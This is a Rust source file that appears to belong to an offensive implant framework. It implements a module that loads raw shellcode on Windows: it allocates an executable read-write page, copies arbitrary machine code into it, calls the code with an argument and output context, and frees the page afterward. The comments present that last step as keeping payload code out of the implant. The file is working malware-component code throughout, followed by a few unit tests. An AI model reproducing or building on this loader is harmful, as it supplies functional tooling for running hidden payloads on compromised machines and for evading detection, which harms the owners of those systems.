//! Raw shellcode: a position independent piece of machine code.
//!
//! A shellcode module is not an object file and not an image: it is a few
//! dozen bytes of code that expects to run where it is put. The loader gives
//! it exactly what it needs and nothing else:
//!
//! * the arguments of the module, encoded the way the protocol encodes
//!   everything else, in a buffer the module may read,
//! * an output buffer the module may write to,
//! * a small structure that says where those buffers are.
//!
//! The structure is handed over in the first argument register, and the
//! module is *position independent*: it must not assume where it landed, and
//! it must not assume where the buffers are. That is the whole contract, and
//! it is why the loader can put the code anywhere it likes.
//!
//! The loader is Windows only: it needs an executable page, and the other
//! platforms the framework runs on have no way to ask for one from the
//! standard library. On those platforms the loader says so instead of
//! pretending to have run anything.

/// The largest output a shellcode module may produce.
pub const MAX_OUTPUT: usize = 256 * 1024;

/// The context a shellcode module receives.
///
/// The module gets a pointer to this structure in its first argument
/// register. Every field is a pointer or a length, so the structure itself
/// is position independent: the module reads it relative to the address it
/// was given and needs to know nothing else about the process.
#[repr(C)]
pub struct Context {
    /// The arguments of the module.
    pub args: *const u8,
    /// The length of the arguments.
    pub args_len: usize,
    /// The buffer the module writes its answer to.
    pub out: *mut u8,
    /// The length of the output buffer.
    pub out_len: usize,
    /// The number of bytes the module wrote.
    pub written: usize,
}

/// The result of running a shellcode module.
#[derive(Clone, Debug, Default)]
pub struct Outcome {
    /// The exit code of the module.
    pub code: i64,
    /// What the module wrote.
    pub out: Vec<u8>,
}

/// The signature of a shellcode entry point.
#[cfg(windows)]
type Entry = unsafe extern "C" fn(*mut Context) -> i64;

/// Run a shellcode module.
///
/// The module is copied into a page of executable memory, called with the
/// context, and the page is released as soon as it returns: the code of a
/// module does not stay in the implant.
pub fn run(code: &[u8], args: &[u8]) -> Result<Outcome, String> {
    if code.is_empty() {
        return Err("shellcode: the module is empty".to_string());
    }
    run_module(code, args)
}

/// Run a shellcode module on windows.
#[cfg(windows)]
fn run_module(code: &[u8], args: &[u8]) -> Result<Outcome, String> {
    use crate::post::windows;
    use std::ffi::c_void;
    let page = unsafe {
        windows::VirtualAlloc(
            std::ptr::null_mut(),
            code.len(),
            windows::MEM_COMMIT | windows::MEM_RESERVE,
            windows::PAGE_EXECUTE_READWRITE,
        )
    };
    if page.is_null() {
        return Err("shellcode: the memory could not be allocated".to_string());
    }
    unsafe {
        std::ptr::copy_nonoverlapping(code.as_ptr(), page as *mut u8, code.len());
    }
    let mut out = vec![0u8; MAX_OUTPUT];
    let mut context = Context {
        args: args.as_ptr(),
        args_len: args.len(),
        out: out.as_mut_ptr(),
        out_len: out.len(),
        written: 0,
    };
    let entry: Entry = unsafe { std::mem::transmute(page as *mut u8) };
    let returned = unsafe { entry(&mut context) };
    unsafe {
        windows::VirtualFree(page as *mut c_void, 0, windows::MEM_RELEASE);
    }
    let written = context.written.min(out.len());
    Ok(Outcome {
        code: returned,
        out: out[..written].to_vec(),
    })
}

/// Run a shellcode module.
///
/// Raw shellcode needs an executable page, and only the Windows build of the
/// implant can ask for one.
#[cfg(not(windows))]
fn run_module(_code: &[u8], _args: &[u8]) -> Result<Outcome, String> {
    Err("shellcode: raw shellcode is a Windows capability".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn an_empty_module_is_refused() {
        let err = run(&[], &[]).unwrap_err();
        assert!(err.contains("empty"), "{err}");
    }

    #[test]
    fn the_context_is_position_independent() {
        // The structure holds nothing but pointers and lengths, so a module
        // that only knows its own address can still read it.
        let context = Context {
            args: std::ptr::null(),
            args_len: 0,
            out: std::ptr::null_mut(),
            out_len: 0,
            written: 0,
        };
        let size = std::mem::size_of::<Context>();
        assert_eq!(size, 5 * std::mem::size_of::<usize>());
    }
}
